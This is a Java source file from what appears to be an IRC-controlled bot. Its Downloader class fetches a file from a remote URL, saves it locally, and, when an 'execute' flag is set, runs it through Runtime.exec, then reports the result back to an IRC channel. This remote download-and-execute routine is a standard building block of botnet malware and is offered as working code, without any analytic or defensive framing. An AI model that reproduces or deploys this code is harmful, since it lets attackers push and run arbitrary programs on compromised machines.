package mn.num;

import java.net.URL;
import java.net.URLConnection;
import java.io.*;

public class Downloader extends Thread {
    private String url;
    private String path;
    private static int execute;
    @SuppressWarnings("static-access")
    public Downloader(String url, String path, int execute) {
        this.url = url;
        this.path = path;
        this.execute = execute;
    }

    public static String download(String address, String localFileName) throws Exception {
        OutputStream out = null;
        URLConnection conn = null;
        InputStream in = null;
        try {
            URL url = new URL(address);
            try {
                out = new BufferedOutputStream(new FileOutputStream(localFileName));
            } catch (Exception e) {
                IRC.sendMessage(Config.getChannel(), "Exception occurrence" + ", possible file not found or access denied!");
                out.close();
                return "Error while downloading!";
            }
            conn = url.openConnection();
            in = conn.getInputStream();
            byte[] buffer = new byte[1024];
            int numRead;
            long numWritten = 0;
            while ((numRead = in.read(buffer)) != -1) {
                out.write(buffer, 0, numRead);
                numWritten += numRead;
            }
        } catch (Exception exception) {
            exception.printStackTrace();
            return "Error while downloading file!";
        } finally {
            try {
                if (execute == 1) {
                    Runtime rt = Runtime.getRuntime();
                    rt.exec(localFileName);
                }
                if (in != null) {
                    in.close();
                }
                if (out != null) {
                    out.close();
                }
                return "File downloaded sucsessfully!";
            } catch (IOException ioe) {
            }
        }
        return "Unknown error!";
    }

    public static void download(String address) throws Exception {
        int lastSlashIndex = address.lastIndexOf('/');
        if (lastSlashIndex >= 0 && lastSlashIndex < address.length() - 1) {
            download(address, address.substring(lastSlashIndex + 1));
        } else {
            IRC.sendMessage(Config.getChannel(), "Could not figure out local file name for " + address);
        }
    }

    public void run() {
        try {
            IRC.sendMessage(Config.getChannel(), download(url, path));
        } catch (Exception e) {
            Misc.print("Exception occourence, possible file not found or acsess denied!");
            IRC.sendMessage(Config.getChannel(), "Exception occourence, possible file not found or acsess denied!");
        }
    }
}